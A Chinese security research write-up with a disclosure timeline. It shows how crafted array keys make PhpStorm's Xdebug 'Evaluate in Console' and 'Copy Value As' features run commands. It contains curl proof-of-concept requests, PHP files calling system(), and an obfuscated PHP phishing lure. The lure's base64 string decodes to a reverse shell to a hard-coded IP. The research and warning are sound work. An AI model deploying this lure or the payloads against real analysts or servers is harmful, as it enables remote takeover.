**作者: dawu@知道创宇404实验室**  
**日期：2018/08/16**  
**英文版本：<https://paper.seebug.org/992/>**

### 0x00 前言

在调试 `Drupal` 远程命令执行漏洞（CVE-2018-7600 && CVE-2018-7602）时，存在一个超大的数组 `$form`
。在该数组中寻找到注入的变量，可以帮助调试人员确认攻击是否成功。

但是作为一个安全研究人员，在调试时也保持着一颗发现漏洞的心，所以知道 `$form` 中的每一个元素的内容就十分重要了。然而 `PhpStorm`
这款调试工具需要不断的点击才能看到数组中各元素的值，这显然非常低效。

笔者在官方手册中发现了一种解决方案：

![](https://images.seebug.org/content/images/2018/08/2c8cea46-b9b5-4796-9e32-6f9a8067712c.png-w331s)

![](https://images.seebug.org/content/images/2018/08/130c590a-da33-4575-bc04-fc5253c23510.png-w331s)

但是 `Evaluate in Console` 看上去就具有一定的危险性，所以笔者深入研究了该功能的实现过程并成功通过 `PhpStorm` 在
`Xdebug` 服务器上执行了命令。

### 0x01 准备工作

#### 1.1 Xdebug的工作原理和潜在的攻击面

`Xdebug` 工作原理和潜在的攻击面前人已有部分文章总结：

  * [Xdebug: A Tiny Attack Surface](https://paper.seebug.org/397/)
  * [利用恶意页面攻击本地Xdebug](https://paper.seebug.org/558/)

综合上述参考链接，已知的攻击面有：

  1. `eval` 命令： 可以执行代码。
  2. `property_set && property_get` 命令: 可以执行代码
  3. `source` 命令: 可以阅读源码。
  4. 利用 `DNS` 重绑技术可能可以导致本地 `Xdebug` 服务器被攻击。

就本文而言 `PhpStorm` 和 `Xdebug` 进行调试的工作流程如下：

  1. `PhpStorm` 开启调试监听，默认绑定 `9000`、`10137`、`20080` 端口等待连接。
  2. 开发者使用 `XDEBUG_SESSION=PHPSTORM` （XDEBUG_SESSION的内容可以配置，笔者设置的是PHPSTORM） 访问 `php` 页面。
  3. `Xdebug` 服务器反连至 `PhpStorm` 监听的 `9000` 端口。
  4. 通过步骤3建立的连接，开发者可以进行阅读源码、设置断点、执行代码等操作。

如果我们可以控制 `PhpStorm` 在调试时使用的命令，那么在步骤4中攻击面 `1`、`2`、`3` 将会直接威胁到 `Xdebug` 服务器的安全。

#### 1.2 实时嗅探脚本开发

`工欲善其事，必先利其器`。笔者开发了一个脚本用于实时显示 `PhpStorm` 和 `Xdebug` 交互的流量（该脚本在下文截图中会多次出现）：

    
    
    from scapy.all import *
    import base64
    
    
    Terminal_color = {
        "DEFAULT": "\033[0m",
        "RED": "\033[1;31;40m"
    }
    
    def pack_callback(packet):
        try:
            if packet[TCP].payload.raw_packet_cache != None:
                print("*"* 200)
                print("%s:%s --> %s:%s " %(packet['IP'].src,packet.sport,packet['IP'].dst,packet.dport))
                print(packet[TCP].payload.raw_packet_cache.decode('utf-8'))
                if packet[TCP].payload.raw_packet_cache.startswith(b"eval"):
                    print("%s[EVAL] %s %s"%(Terminal_color['RED'],base64.b64decode(packet[TCP].payload.raw_packet_cache.decode('utf-8').split("--")[1].strip()).decode('utf-8'),Terminal_color['DEFAULT']))
                if packet[TCP].payload.raw_packet_cache.startswith(b"property_set"):
                    variable = ""
                    for i in packet[TCP].payload.raw_packet_cache.decode('utf-8').split(" "):
                        if "$" in i:
                            variable = i
                    print("%s[PROPERTY_SET] %s=%s %s"%(Terminal_color['RED'],variable,base64.b64decode(packet[TCP].payload.raw_packet_cache.decode('utf-8').split("--")[1].strip()).decode('utf-8'),Terminal_color['DEFAULT']))
                if b"command=\"eval\"" in packet[TCP].payload.raw_packet_cache:
                    raw_data = packet[TCP].payload.raw_packet_cache.decode('utf-8')
                    CDATA_postion = raw_data.find("CDATA")
                    try:
                        eval_result = base64.b64decode(raw_data[CDATA_postion+6:CDATA_postion+raw_data[CDATA_postion:].find("]")])
                        print("%s[CDATA] %s %s"%(Terminal_color['RED'],eval_result,Terminal_color['DEFAULT']))
                    except:
                        pass
        except Exception as e:
            print(e)
            print(packet[TCP].payload)
    
    dpkt  = sniff(iface="vmnet5",filter="tcp", prn=pack_callback)
    # 这里设置的监听网卡是 vmnet5，使用时可以根据实际的网卡进行修改

### 0x02 通过 `PhpStorm` 在 `Xdebug` 服务器上执行命令

#### 2.1 通过 `Evaluate in Console` 执行命令

通过上文的脚本，可以很清晰的看到我们在执行 `Evaluate in Console` 命令时发生了什么（红色部分是 `base64` 解码后的结果）：

![](https://images.seebug.org/content/images/2018/08/a307b812-afaa-444c-94b1-86a21ddc854f.png-w331s)

如果我们可以控制 `$q`，那我们就可以控制 `eval` 的内容。但是在 `PHP`
[官方手册](http://php.net/manual/en/language.variables.basics.php)中，明确规定了变量名称应该由
`a-zA-Z_\x7f-\xff` 组成：

> Variable names follow the same rules as other labels in PHP. A valid
> variable name starts with a letter or underscore, followed by any number of
> letters, numbers, or underscores. As a regular expression, it would be
> expressed thus: '[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*'

所以通过控制 `$q` 来控制 `eval` 的内容并不现实。但是在 `PhpStorm` 获取数组中某个元素时，会将该元素的名称带入 `eval`
的语句中。

如图所示，定义数组如下： `$a = ( "aaa'bbb"=>"ccc")`，并在 `PhpStorm` 中使用 `Evaluate in
Console` 功能。

![](https://images.seebug.org/content/images/2018/08/88d24462-35eb-487f-ae46-7c29641fec9a.png-w331s)

可以看到单引号未做任何过滤，这也就意味着我可以控制 `eval` 的内容了。在下图中，我通过对 `$a['aaa\'];#']` 变量使用
`Evaluate in Console` 功能获取到 `$a['aaa']` 的值。

![](https://images.seebug.org/content/images/2018/08/c73b08f3-d8cb-438f-8f9e-77c00e752f1c.png-w331s)

精心构造的请求和代码如下：

    
    
    $ curl "http://192.168.88.128/first_pwn.php?q=a%27%5d(\$b);%09%23" --cookie "XDEBUG_SESSION=PHPSTORM"
    
    <?php
    $a = array();
    $q = $_GET['q'];
    $a['a'] = 'system';
    $b = "date >> /tmp/dawu";
    $a[$q] = "aaa";
    
    echo $a;
    ?>

![](https://images.seebug.org/content/images/2018/08/e68d8196-9f03-4be3-8cae-16c6cbfafeb3.gif-w331s)

但在这个例子中存在一个明显的缺陷：`可以看到恶意的元素名称`。如果用于钓鱼攻击，会大大降低成功率，所以对上述的代码进行了一定的修改：

    
    
    $ curl "http://192.168.88.128/second_pwn.php?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%27%5d(\$b);%09%23" --cookie "XDEBUG_SESSION=PHPSTORM"
    
    <?php
    $a = array();
    $q = $_GET['q'];
    $a['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'] = 'system';
    $b = "date >> /tmp/dawu";
    $a[$q] = "aaa";
    
    echo $a;
    ?>

在元素名称足够长时，`PhpStorm` 会自动隐藏后面的部分：

![](https://images.seebug.org/content/images/2018/08/52ff7357-f4ef-4fd4-818a-0a64695b6639.png-w331s)

![](https://images.seebug.org/content/images/2018/08/37163e44-9e18-4a3f-ad60-65b387f149eb.gif-w331s)

#### 2.2 通过 `Copy Value As` 执行命令

继续研究发现，`COPY VALUE AS (print_r/var_export/json_encode)` 同样也会使用 `Xdebug` 的
`eval` 命令来实现相应的功能：

![](https://images.seebug.org/content/images/2018/08/bf80e145-ba58-482a-a199-cd2b4a131de2.png-w331s)

再次精心构造相应的请求和代码后，可以再次在 `Xdebug` 服务器上执行命令：

    
    
    curl "http://192.168.88.128/second_pwn.php?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%27%5d(\$b));%23" --cookie "XDEBUG_SESSION=PHPSTORM"

![](https://images.seebug.org/content/images/2018/08/7d266d36-3d8f-4713-953a-ec09b614d90d.gif-w331s)

#### 2.3 实际攻击探究

基于上述的研究，我认为可以通过 `PhpStorm` 实现钓鱼攻击。假设的攻击流程如下：

  1. 攻击者确保受害者可以发现恶意的 `PHP` 文件。例如安全研究人员之间交流 `某大马` 具体实现了哪些功能、运维人员发现服务器上出现了可疑的 `PHP` 文件。
  2. 如果受害者在大致浏览 `PHP` 文件内容后，决定使用 `PhpStorm` 分析该文件。
  3. 受害者使用 `COPY VALUE AS (print_r/var_export/json_encode)`、`Evaluate array in Console` 等功能。命令将会执行。
  4. 攻击者可以收到受害者 `Xdebug` 服务器的 `shell`。

![](https://images.seebug.org/content/images/2018/08/729af410-f3fc-4e6d-bf27-0fab13b360f1.png-w331s)

精心构造的代码如下（其中的反连IP地址为临时开启的VPS）：

    
    
    <?php
    $chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMOPQRSTUVWXYZ_N+;'\"()\$ #[]";
    $a = $chars[1].$chars[0].$chars[18].$chars[4].$chars[32].$chars[30].$chars[61].$chars[3].$chars[4].$chars[2].$chars[14].$chars[3].$chars[4]; //base64_decode
    $b = $chars[4].$chars[21].$chars[0].$chars[11]; //eval
    $c = $chars[18].$chars[24].$chars[18].$chars[19].$chars[4].$chars[12]; //system
    
    $e = $chars[2].$chars[42].$chars[7].$chars[22].$chars[44].$chars[38].$chars[27].$chars[24].$chars[44].$chars[38].$chars[2].$chars[10].$chars[2].$chars[28].$chars[35].$chars[9].$chars[0].$chars[25].$chars[27].$chars[12].$chars[2].$chars[28].$chars[35].$chars[9].$chars[0].$chars[28].$chars[35].$chars[22].$chars[60].$chars[57].$chars[30].$chars[14].$chars[44].$chars[9].$chars[40].$chars[26].$chars[49].$chars[53].$chars[30].$chars[24].$chars[49].$chars[38].$chars[30].$chars[24].$chars[48].$chars[25].$chars[36].$chars[20].$chars[62].$chars[54].$chars[44].$chars[8].$chars[47].$chars[39].$chars[10].$chars[31].$chars[49].$chars[54].$chars[10].$chars[15].$chars[49].$chars[28].$chars[56].$chars[30].$chars[60].$chars[57].$chars[48].$chars[14].$chars[44].$chars[8].$chars[35].$chars[8].$chars[0].$chars[57].$chars[30].$chars[21].$chars[59].$chars[12].$chars[41].$chars[25].$chars[0].$chars[38].$chars[36].$chars[19].$chars[0].$chars[53].$chars[36].$chars[34].$chars[45].$chars[9].$chars[48].$chars[6].$chars[50].$chars[8].$chars[59].$chars[25].$chars[44].$chars[39].$chars[44].$chars[63].$chars[45].$chars[9].$chars[48].$chars[6].$chars[44].$chars[38].$chars[44].$chars[15].$chars[49].$chars[24].$chars[2].$chars[46]; // cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE0OS4yOC4yMzAuNTIiLDk5OTkpO2V4ZWMoIi9iaW4vYmFzaCAtaSA8JjMgPiYzIDI+JjMgICIpOycK
    $f = $chars[2].$chars[42].$chars[7].$chars[22].$chars[44].$chars[38].$chars[27].$chars[24].$chars[44].$chars[38].$chars[2].$chars[10].$chars[2].$chars[28].$chars[35].$chars[9].$chars[0].$chars[25].$chars[27].$chars[12].$chars[2].$chars[28].$chars[35].$chars[9].$chars[0].$chars[28].$chars[35].$chars[22].$chars[60].$chars[57].$chars[30].$chars[14].$chars[44].$chars[9].$chars[40].$chars[26].$chars[49].$chars[53].$chars[30].$chars[24].$chars[49].$chars[38].$chars[30].$chars[24].$chars[48].$chars[25].$chars[36].$chars[20].$chars[62].$chars[54].$chars[44].$chars[8].$chars[47].$chars[39].$chars[10].$chars[31].$chars[49].$chars[54].$chars[10].$chars[15].$chars[49].$chars[28].$chars[56].$chars[30].$chars[60].$chars[57].$chars[48].$chars[14].$chars[44].$chars[8].$chars[35].$chars[8].$chars[0].$chars[57].$chars[30].$chars[21].$chars[59].$chars[12].$chars[41].$chars[25].$chars[0].$chars[38].$chars[36].$chars[19].$chars[0].$chars[53].$chars[36].$chars[34].$chars[45].$chars[9].$chars[48].$chars[6].$chars[50].$chars[8].$chars[59].$chars[25].$chars[44].$chars[39].$chars[44].$chars[63].$chars[45].$chars[9].$chars[48].$chars[6].$chars[44].$chars[38].$chars[44].$chars[15].$chars[49].$chars[24].$chars[2].$chars[46].$chars[65].$chars[73].$chars[67].$chars[69].$chars[0].$chars[67].$chars[69].$chars[4].$chars[68].$chars[68].$chars[68].$chars[64].$chars[71]; // cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE0OS4yOC4yMzAuNTIiLDk5OTkpO2V4ZWMoIi9iaW4vYmFzaCAtaSA8JjMgPiYzIDI+JjMgICIpOycK'](\$a(\$z)));#
    $g = $chars[2].$chars[42].$chars[7].$chars[22].$chars[44].$chars[38].$chars[27].$chars[24].$chars[44].$chars[38].$chars[2].$chars[10].$chars[2].$chars[28].$chars[35].$chars[9].$chars[0].$chars[25].$chars[27].$chars[12].$chars[2].$chars[28].$chars[35].$chars[9].$chars[0].$chars[28].$chars[35].$chars[22].$chars[60].$chars[57].$chars[30].$chars[14].$chars[44].$chars[9].$chars[40].$chars[26].$chars[49].$chars[53].$chars[30].$chars[24].$chars[49].$chars[38].$chars[30].$chars[24].$chars[48].$chars[25].$chars[36].$chars[20].$chars[62].$chars[54].$chars[44].$chars[8].$chars[47].$chars[39].$chars[10].$chars[31].$chars[49].$chars[54].$chars[10].$chars[15].$chars[49].$chars[28].$chars[56].$chars[30].$chars[60].$chars[57].$chars[48].$chars[14].$chars[44].$chars[8].$chars[35].$chars[8].$chars[0].$chars[57].$chars[30].$chars[21].$chars[59].$chars[12].$chars[41].$chars[25].$chars[0].$chars[38].$chars[36].$chars[19].$chars[0].$chars[53].$chars[36].$chars[34].$chars[45].$chars[9].$chars[48].$chars[6].$chars[50].$chars[8].$chars[59].$chars[25].$chars[44].$chars[39].$chars[44].$chars[63].$chars[45].$chars[9].$chars[48].$chars[6].$chars[44].$chars[38].$chars[44].$chars[15].$chars[49].$chars[24].$chars[2].$chars[46].$chars[21].$chars[24].$chars[20].$chars[6].$chars[7].$chars[8].$chars[13].$chars[3].$chars[9].$chars[18].$chars[1].$chars[20].$chars[8].$chars[6].$chars[7].$chars[14].$chars[2].$chars[13].$chars[18].$chars[0];
    
    $i = $chars[60].$chars[57].$chars[62].$chars[14].$chars[1].$chars[24].$chars[37].$chars[14].$chars[60].$chars[57].$chars[23].$chars[18].$chars[1].$chars[24].$chars[37].$chars[29].$chars[1].$chars[29].$chars[45].$chars[18].$chars[60].$chars[39].$chars[19].$chars[11].$chars[59].$chars[28].$chars[7].$chars[21].$chars[44].$chars[42].$chars[7].$chars[11].$chars[1].$chars[42].$chars[23].$chars[21].$chars[44].$chars[43].$chars[3].$chars[21].$chars[2].$chars[12].$chars[23].$chars[10].$chars[49].$chars[28].$chars[56].$chars[9].$chars[0].$chars[42].$chars[34].$chars[6].$chars[0].$chars[42].$chars[56].$chars[18].$chars[1].$chars[42].$chars[34].$chars[6].$chars[3].$chars[28].$chars[35].$chars[24].$chars[1].$chars[42].$chars[51].$chars[33].$chars[60].$chars[57].$chars[62].$chars[14].$chars[1].$chars[24].$chars[37].$chars[14].$chars[60].$chars[57].$chars[23].$chars[18].$chars[1].$chars[24].$chars[37].$chars[29].$chars[1].$chars[29].$chars[45].$chars[18].$chars[60].$chars[39].$chars[19].$chars[11].$chars[59].$chars[28].$chars[7].$chars[21].$chars[44].$chars[42].$chars[7].$chars[11].$chars[1].$chars[42].$chars[23].$chars[21].$chars[44].$chars[43].$chars[3].$chars[21].$chars[2].$chars[12].$chars[23].$chars[10].$chars[49].$chars[28].$chars[56].$chars[9].$chars[0].$chars[42].$chars[34].$chars[6].$chars[0].$chars[42].$chars[56].$chars[18].$chars[1].$chars[42].$chars[34].$chars[6].$chars[3].$chars[28].$chars[35].$chars[24].$chars[1].$chars[42].$chars[51].$chars[33].$chars[60].$chars[57].$chars[62].$chars[14].$chars[1].$chars[24].$chars[37].$chars[14].$chars[60].$chars[57].$chars[23].$chars[18].$chars[1].$chars[24].$chars[37].$chars[29].$chars[1].$chars[29].$chars[45].$chars[18].$chars[60].$chars[39].$chars[19].$chars[11].$chars[59].$chars[28].$chars[7].$chars[21].$chars[44].$chars[42].$chars[7].$chars[11].$chars[1].$chars[42].$chars[23].$chars[21].$chars[44].$chars[43].$chars[3].$chars[21].$chars[2].$chars[12].$chars[23].$chars[10].$chars[49].$chars[28].$chars[56].$chars[9].$chars[0].$chars[42].$chars[34].$chars[6].$chars[0].$chars[42].$chars[56].$chars[18].$chars[1].$chars[42].$chars[34].$chars[6].$chars[3].$chars[28].$chars[35].$chars[24].$chars[1].$chars[42].$chars[51].$chars[33].$chars[60].$chars[57].$chars[62].$chars[14].$chars[1].$chars[24].$chars[37].$chars[14].$chars[60].$chars[57].$chars[23].$chars[18].$chars[1].$chars[24].$chars[37].$chars[29].$chars[1].$chars[29].$chars[45].$chars[18].$chars[60].$chars[39].$chars[19].$chars[11].$chars[59].$chars[28].$chars[7].$chars[21].$chars[44].$chars[42].$chars[7].$chars[11].$chars[1].$chars[42].$chars[23].$chars[21].$chars[44].$chars[43].$chars[3].$chars[21].$chars[2].$chars[12].$chars[23].$chars[10].$chars[49].$chars[28].$chars[56].$chars[9].$chars[0].$chars[42].$chars[34].$chars[6].$chars[0].$chars[42].$chars[56].$chars[18].$chars[1].$chars[42].$chars[34].$chars[6].$chars[3].$chars[28].$chars[35].$chars[24].$chars[1].$chars[42].$chars[51].$chars[33].$chars[60].$chars[57].$chars[62].$chars[14].$chars[1].$chars[24].$chars[37].$chars[14].$chars[60].$chars[57].$chars[23].$chars[18].$chars[1].$chars[24].$chars[37].$chars[29].$chars[1].$chars[29].$chars[45].$chars[18].$chars[60].$chars[39].$chars[19].$chars[11].$chars[59].$chars[28].$chars[7].$chars[21].$chars[44].$chars[42].$chars[7].$chars[11].$chars[1].$chars[42].$chars[23].$chars[21].$chars[44].$chars[43].$chars[3].$chars[21].$chars[2].$chars[12].$chars[23].$chars[10].$chars[49].$chars[28].$chars[56].$chars[9].$chars[0].$chars[42].$chars[34].$chars[6].$chars[0].$chars[42].$chars[56].$chars[18].$chars[1].$chars[42].$chars[34].$chars[6].$chars[3].$chars[28].$chars[35].$chars[24].$chars[1].$chars[42].$chars[51].$chars[33].$chars[60].$chars[57].$chars[62].$chars[14].$chars[1].$chars[24].$chars[37].$chars[14].$chars[60].$chars[57].$chars[23].$chars[18].$chars[1].$chars[24].$chars[37].$chars[29].$chars[1].$chars[29].$chars[45].$chars[18].$chars[60].$chars[39].$chars[19].$chars[11].$chars[59].$chars[28].$chars[7].$chars[21].$chars[44].$chars[42].$chars[7].$chars[11].$chars[1].$chars[42].$chars[23].$chars[21].$chars[44].$chars[43].$chars[3].$chars[21].$chars[2].$chars[12].$chars[23].$chars[10].$chars[49].$chars[22].$chars[14]; //echo hello world; base64
    
    
    $n = array(
        $e => $c,
        $f => $i,
        $g => $a,
    );
    
    $n[$e]($n[$g]($n[$f]));
    ?>

直接执行该 `PHP` 代码，将只会多次运行 `system("echo hello world;")`。但是调试人员并不会执行 `PHP`
代码，他也许会取出 `$n[$f]` 的值，然后通过 `echo XXXXXXXX|base64 -d` 解码出具体的内容。

如果他使用 `COPY VALUE BY print_r` 拷贝对应的变量，他的 `Xdebug` 服务器上将会被执行命令。

在下面这个 `gif` 中，左边是攻击者的终端，右边是受害者的 `debug` 过程。

（GIF中存在一处笔误： `decise` 应为 `decide`）

![](https://images.seebug.org/content/images/2018/08/9502f283-139b-4dd7-8caa-81b26ef43f92.gif-w331s)

### 0x03 结语

在整个漏洞的发现过程中，存在一定的曲折，但这也正是安全研究的乐趣所在。`PhpStorm`
官方最终没有认可该漏洞，也是一点小小的遗憾。在此将该发现分享出来，一方面是为了跟大家分享思路，另一方面也请安全研究人员使用 `PhpStorm`
调试代码时慎用 `COPY VALUE AS (print_r/var_export/json_encode)`、`Evaluate array in
Console` 功能。

### 0x04 时间线

2018/06/08: 发现 `Evaluate in Console` 存在 `在 Xdebug 服务器上` 执行命令的风险。  
2018/06/31 - 2018/07/01: 尝试分析 `Evaluate in Console` 的问题，发现新的利用点 `Copy Value`.
即使 `eval` 是 `Xdebug` 提供的功能，但是 `PhpStorm` 没有过滤单引号导致我们可以在 `Xdebug`
服务器上执行命令，所以整理文档联系 `security@jetbrains.com`。  
2018/07/04: 收到官方回复，认为这是 `Xdebug` 的问题，`PhpStorm` 在调试过程中不提供对服务器资源的额外访问权限。  
2018/07/06: 再次联系官方，说明该攻击可以用于钓鱼攻击。  
2018/07/06: 官方认为用户在服务器上运行不可信的代码会造成服务器被破坏，这与 `PhpStorm` 无关，这也是 `PhpStorm`
不影响服务器安全性的原因。官方同意我披露该问题。  
2018/08/16： 披露该问题。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/668/>

